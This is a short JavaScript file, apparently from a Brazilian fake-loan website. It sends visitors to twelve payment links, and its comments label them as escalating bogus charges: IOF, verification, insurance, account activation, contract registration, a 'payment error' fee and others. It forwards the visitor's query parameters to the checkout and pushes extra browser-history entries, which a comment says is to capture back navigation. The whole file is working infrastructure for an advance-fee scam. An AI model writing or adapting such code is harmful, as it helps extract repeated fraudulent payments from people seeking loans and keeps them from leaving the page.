const baseLinks = {
    up1: "https://go.sharkpayments.com.br/aoy4en1fgy", // IOF
    up2: "https://go.sharkpayments.com.br/tu27rzm4zp", // Taxa de verificação de IOF
    up3: "https://go.sharkpayments.com.br/wjotszd7no", // Seguro Prestamista "tarifa de cadastro"
    up4: "https://go.sharkpayments.com.br/peewbobaok", // NFe
    up5: "https://go.sharkpayments.com.br/ci2ublzw4u", // Ativar conta
    up6: "https://go.sharkpayments.com.br/kbuyi328ce", // Taxa de registro do contrato
    up7: "https://go.sharkpayments.com.br/c9gu2kika1", // Parabéns, 20k adicional
    up8: "https://go.sharkpayments.com.br/lqkmaaeutn", // Erro no pagamento - 14,06
    up9: "https://go.sharkpayments.com.br/fb83qietrl", // APP - 11,99
    up10:"https://go.sharkpayments.com.br/mvqsqqczt9", // Taxa de Abertura TAC - 16,92
    up11:"https://go.sharkpayments.com.br/pbtgdtyy8i", // Taxa de Consultoria Financeira - 19,53
    up12:"https://go.sharkpayments.com.br/binmsf865k" // Taxa de Processamento Administrativo - 31,92

};

function redirect(key) {
    try {
        if (!baseLinks[key]) {
            throw new Error(`Link para ${key} não encontrado!`);
        }

        const url = new URL(baseLinks[key]);
        url.search = new URLSearchParams(window.location.search).toString();

        window.location.href = url.href;
        
    } catch (error) {
        console.error('Erro no redirecionamento:', error);
        alert(`Erro: ${error.message || "Não foi possível redirecionar"}`);
    }
}

// Adiciona duas entradas no histórico para capturar a navegação para trás
history.pushState({}, '', location.href);
history.pushState({}, '', location.href);


